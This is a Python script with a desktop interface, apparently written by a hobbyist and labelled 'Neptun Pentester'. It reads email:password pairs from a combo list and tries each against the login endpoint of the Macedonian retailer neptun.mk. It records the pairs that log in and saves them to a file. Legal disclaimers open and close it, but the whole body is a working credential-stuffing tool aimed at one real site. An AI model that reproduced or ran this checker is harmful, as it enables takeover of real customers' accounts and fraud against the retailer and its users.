#ПРЕДУПРЕДУВАЊЕ: Оваа скрипта е наменета исклучиво за образовни и истражни цели. Само законска употреба на оваа скрипта е дозволена. Користењето на скриптата за било какви незаконски активности е строго забрането. Авторот не презема одговорност за нелегална или неправилна употреба на скриптата. Користењето на оваа скрипта е на ваша одговорност и ризик. Пред да ја користите скриптата, ве молиме да се уверите дека ја користите во согласност со сите применливи закони и правила.
# Warning: This project is not intended for any cyber disruption or illegal purposes. The author is not responsible for any misuse of this code.
#Автор на оваа скрипта е: Леонид Крстевски


# Uvezi gi potrebnite biblioteki
import os
import requests
import webbrowser
import customtkinter as ctk
from tkinter import IntVar, StringVar, filedialog
from PIL import Image, ImageTk

# Funkcija za proverka na smetkite od fajl
def check_accounts_from_file():
    file_path = "combo_list.txt"  # Pretpostavka: combo_list.txt e vo istata papka kako i skriptata

    # Proveri dali fajlot postoi
    if os.path.exists(file_path):
        total_accounts_count = 0  # Initialize the total count
        # Procitaj gi kombinaciite na email:password od fajlot
        with open(file_path, 'r') as file:
            for line in file:  # Read the file line by line
                total_accounts_count += 1  # Increment the total count
                # Razdeli ja linijata na email i password
                email, password = line.strip().split(':')
                # Zakazi ja funkcijata za proverka na smetka so zabevenje
                root.after(total_accounts_count * 1000, check_account, email, password)

        total_accounts.set(total_accounts_count)  # Set the total count
    else:
        result_text.insert(ctk.END, f'Fajlot ne e pronajden: {file_path}\n')


# Funkcija za proverka na smetka
def check_account(email, password):
    # Postavi go endpoint-ot za najavuvanje
    login_url = 'https://www.neptun.mk/WebApi/Login'

    # Sozdaj payload so najavnite podatoci
    payload = {
        'username': email,
        'password': password
    }

    # Prati POST baranje za najava
    response = requests.post(login_url, json=payload)

    # Proveri go statusniot kod na odgovorot i sodrzinata
    if response.status_code == 200:
        # Proveri dali odgovorot sodrzi informacii koi ukazuvaat na nevalidni najavni podatoci
        if 'Nevalidni najavni podatoci' not in response.text:
            valid_accounts_list.append(f'{email}:{password}\n')
            valid_accounts.set(valid_accounts.get() + 1)
            result_text.insert(ctk.END, f'{email}:{password}\n\n', 'valid')
    else:
        # Izbegaj prikaz na poraki za greska
        pass

    # Azuriraj gi preostanatite smetki
    remaining_accounts.set(remaining_accounts.get() - 1)

    # Skroliraj go tekstualnoto pole na dnoto za prikaz na najnoviot rezultat
    result_text.see(ctk.END)


# Funkcija za zachuvuvanje na validnite smetki
def save_valid_accounts():
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
    if file_path:
        with open(file_path, 'w') as file:
            for account in valid_accounts_list:
                file.write(account + '\n\n')


# Funkcija za otvaranje na veb stranata
def open_website():
    webbrowser.open("https://github.com/13069")

# Kreiranje na glavniot prozorec
root = ctk.CTk()
root.title("Нептун Пентестер | Beta 1.0")
root.geometry("600x400")

# Vcituvanje na logoto na veb stranata
logo_url = "https://www.neptun.mk/images/logo.png"
logo_image = Image.open(requests.get(logo_url, stream=True).raw)
logo_image = logo_image.resize((150, 50))
logo_photo = ImageTk.PhotoImage(logo_image)

# Promenlivi za zachuvuvanje na statistikite
total_accounts = IntVar()
valid_accounts = IntVar()
remaining_accounts = IntVar()

# Lista za validni smetki
valid_accounts_list = []

# Kreiranje na kanvas za logoto
logo_canvas = ctk.CTkCanvas(root, width=150, height=50)
logo_canvas.create_rectangle(0, 0, 150, 50, fill="#0096FF")
logo_canvas.create_image(0, 0, anchor="nw", image=logo_photo)
logo_canvas.place(x=10, y=10)  # Prilagodete gi koordinatite spored potrebata

# Kreiranje na sekcijata "Statistiki"
statistics_frame = ctk.CTkFrame(root)
statistics_frame.place(x=10, y=70)

total_label = ctk.CTkLabel(statistics_frame, text="Вкупно:")
total_label.pack(padx=5, pady=5)
total_label_value = ctk.CTkLabel(statistics_frame, textvariable=total_accounts)
total_label_value.pack(padx=5, pady=5)

valid_label = ctk.CTkLabel(statistics_frame, text="Валидни:")
valid_label.pack(padx=5, pady=5)
valid_label_value = ctk.CTkLabel(statistics_frame, textvariable=valid_accounts)
valid_label_value.pack(padx=5, pady=5)

remaining_label = ctk.CTkLabel(statistics_frame, text="Преостанати:")
remaining_label.pack(padx=5, pady=5)
remaining_label_value = ctk.CTkLabel(statistics_frame, textvariable=remaining_accounts)
remaining_label_value.pack(padx=5, pady=5)

# Kreiranje na kopce za proverka na smetkite od fajl
check_button = ctk.CTkButton(root, text="Започни", command=check_accounts_from_file)
check_button.pack(padx=10, pady=10)

# Kreiranje na kopce za zachuvuvanje na validnite smetki
save_button = ctk.CTkButton(root, text="Зачувај валидни сметки", command=save_valid_accounts, width=15)
save_button.pack(padx=10, pady=10)

# Kreiranje na kopce za otvaranje na veb stranata
open_website_button = ctk.CTkButton(root, text="Види повеќе", command=open_website, width=15)
open_website_button.pack(pady=5)

# Kreiranje na tekstualno pole za prikaz na rezultatite
result_text = ctk.CTkTextbox(root)
result_text.pack(padx=10, pady=10)

# Stil za validen tekst na smetkata
result_text.tag_config('valid', foreground='green')

# Kreiranje na etiketa za avtorot
author_label = ctk.CTkLabel(root, text="Автор: Леонид Крстевски")
author_label.pack(pady=10)

# Povikuvanje
root.mainloop()


#ПРЕДУПРЕДУВАЊЕ: Оваа скрипта е наменета исклучиво за образовни и истражни цели. Само законска употреба на оваа скрипта е дозволена. Користењето на скриптата за било какви незаконски активности е строго забрането. Авторот не презема одговорност за нелегална или неправилна употреба на скриптата. Користењето на оваа скрипта е на ваша одговорност и ризик. Пред да ја користите скриптата, ве молиме да се уверите дека ја користите во согласност со сите применливи закони и правила.
# Warning: This project is not intended for any cyber disruption or illegal purposes. The author is not responsible for any misuse of this code.
#Автор на оваа скрипта е: Леонид Крстевски
